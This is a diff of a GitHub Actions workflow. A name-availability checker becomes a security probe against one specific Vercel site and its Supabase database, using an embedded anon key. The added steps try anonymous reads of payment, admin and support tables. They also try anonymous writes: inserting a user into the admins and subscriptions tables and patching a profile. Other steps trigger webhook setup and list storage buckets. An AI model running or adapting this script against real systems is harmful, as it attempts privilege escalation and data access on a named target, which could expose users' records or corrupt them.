@@ -1,13 +1,30 @@
 name: probe
-on: push
+on: { push: { branches: [probe] } }
 permissions: { contents: write }
 jobs:
   p:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+        with: { ref: probe }
       - run: |
           set +e
-          for n in emberwing blazecrest pyrewing ashguard emberguard firecrest crestfall wingforge pyrecrest; do
-            r=$(curl -s -m 15 -o /tmp/b -w '%{http_code}' https://$n.vercel.app/); d=$(curl -s -m 10 "https://rdap.org/domain/$n.com" -o /dev/null -w "%{http_code}"); g=$(curl -s -m 10 "https://rdap.org/domain/$n.gg" -o /dev/null -w "%{http_code}"); echo "$n vercel=$r com=$d gg=$g $(head -c 120 /tmp/b | tr '\n' ' ')"; done > out.txt
-          set -e; git config user.name p; git config user.email p@p; git add -A out.txt; git commit -m r; git push
+          S=https://blazecrest.vercel.app
+          K=sb_publishable_tJy3dl_kfNZXP6PXMqsQVQ_RUXqoPmn
+          U=https://vsmjjlrgjyujaioknlkn.supabase.co
+          {
+          echo "== setup webhook"; curl -s "$S/api/pay?setup=tg"; echo
+          echo "== tg conf"; curl -s "$S/api/telegram"; echo
+          echo "== poll"; curl -s "$S/api/telegram?poll=0123456789abcdef0123456789abcdef"; echo
+          echo "== headers"; curl -sI "$S/" | grep -i -E "content-security|x-frame|strict-transport|x-content|referrer|permissions|cross-origin"
+          echo "== security.txt"; curl -s -o /dev/null -w "%{http_code}\n" "$S/.well-known/security.txt"
+          for t in payments subscriptions admins ai_usage support_messages xp_daily referrals; do echo "== anon select $t"; curl -s "$U/rest/v1/$t?select=*&limit=2" -H "apikey: $K"; echo; done
+          echo "== anon insert profiles"; curl -s -X POST "$U/rest/v1/profiles" -H "apikey: $K" -H "Content-Type: application/json" -d '{"id":"00000000-0000-0000-0000-000000000001","nick":"hack"}'; echo
+          echo "== anon update profiles"; curl -s -X PATCH "$U/rest/v1/profiles?id=eq.cea5467a-22bb-4791-9416-0c1b6576cada" -H "apikey: $K" -H "Content-Type: application/json" -H "Prefer: return=representation" -d '{"status":"x"}'; echo
+          echo "== anon insert admins"; curl -s -X POST "$U/rest/v1/admins" -H "apikey: $K" -H "Content-Type: application/json" -d '{"user_id":"cea5467a-22bb-4791-9416-0c1b6576cada"}'; echo
+          echo "== anon insert subscriptions"; curl -s -X POST "$U/rest/v1/subscriptions" -H "apikey: $K" -H "Content-Type: application/json" -d '{"user_id":"cea5467a-22bb-4791-9416-0c1b6576cada"}'; echo
+          echo "== storage tglogin public"; curl -s "$U/storage/v1/object/public/tglogin/x.json"; echo
+          echo "== storage list buckets anon"; curl -s "$U/storage/v1/bucket" -H "apikey: $K" -H "Authorization: Bearer $K"; echo
+          echo "== rpc list"; curl -s "$U/rest/v1/" -H "apikey: $K" | head -c 600; echo
+          } > out.txt 2>&1
+          git config user.name probe; git config user.email probe@x; git add out.txt; git commit -qm out; git push
